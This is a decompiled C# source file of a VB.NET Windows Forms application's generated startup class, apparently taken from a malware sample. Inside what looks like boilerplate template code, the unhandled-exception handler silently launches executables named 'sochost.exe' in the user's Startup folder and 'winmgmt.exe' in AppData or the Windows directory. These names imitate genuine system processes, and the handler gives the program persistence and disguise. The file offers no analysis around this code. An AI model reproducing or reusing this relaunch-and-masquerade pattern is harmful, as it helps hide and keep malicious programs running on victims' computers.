using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace WindowsApplication.My;

[EditorBrowsable(EditorBrowsableState.Never)]
[GeneratedCode("MyTemplate", "8.0.0.0")]
internal class MyApplication : WindowsFormsApplicationBase
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	[DebuggerHidden]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static void Main(string[] args)
	{
		try
		{
			Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.get_UseCompatibleTextRendering());
		}
		finally
		{
		}
		((WindowsFormsApplicationBase)MyProject.Application).Run(args);
	}

	private void MyApplication_UnhandledException(object sender, UnhandledExceptionEventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string fileName = default(string);
		string fileName2 = default(string);
		string fileName3 = default(string);
		string fileName4 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 276:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0031;
						case 4:
							goto IL_0049;
						case 5:
							goto IL_0061;
						case 6:
							goto IL_006b;
						case 8:
							goto IL_007a;
						case 9:
							goto IL_007d;
						case 10:
							goto IL_0096;
						case 11:
							goto IL_00af;
						case 12:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
						case 13:
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00af:
					num = 11;
					Process.Start(fileName);
					break;
					IL_0008:
					num = 2;
					if (Conversions.ToDouble(((ServerComputer)MyProject.Computer).get_Info().get_OSVersion().Substring(0, 1)) != 5.0)
					{
						goto IL_0031;
					}
					goto IL_007a;
					IL_0031:
					num = 3;
					fileName2 = Interaction.Environ("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sochost.exe";
					goto IL_0049;
					IL_0049:
					num = 4;
					fileName3 = Interaction.Environ("appdata") + "\\Microsoft\\Windows\\winmgmt.exe";
					goto IL_0061;
					IL_0061:
					num = 5;
					Process.Start(fileName2);
					goto IL_006b;
					IL_006b:
					num = 6;
					Process.Start(fileName3);
					goto end_IL_0000_3;
					IL_007a:
					num = 8;
					goto IL_007d;
					IL_007d:
					num = 9;
					fileName = Interaction.Environ("userprofile") + "\\Start Menu\\Programs\\Startup\\sochost.exe";
					goto IL_0096;
					IL_0096:
					num = 10;
					fileName4 = Interaction.Environ("systemroot") + "\\winmgmt.exe";
					goto IL_00af;
					end_IL_0000_2:
					break;
				}
				num = 12;
				Process.Start(fileName4);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 276;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerStepThrough]
	public MyApplication()
		: base((AuthenticationMode)0)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		((WindowsFormsApplicationBase)this).add_UnhandledException(new UnhandledExceptionEventHandler(MyApplication_UnhandledException));
		((WindowsFormsApplicationBase)this).set_IsSingleInstance(false);
		((WindowsFormsApplicationBase)this).set_EnableVisualStyles(true);
		((WindowsFormsApplicationBase)this).set_SaveMySettingsOnExit(true);
		((WindowsFormsApplicationBase)this).set_ShutdownStyle((ShutdownMode)0);
	}

	[DebuggerStepThrough]
	protected override void OnCreateMainForm()
	{
		((WindowsFormsApplicationBase)this).set_MainForm((Form)(object)MyProject.Forms.Form1);
	}
}
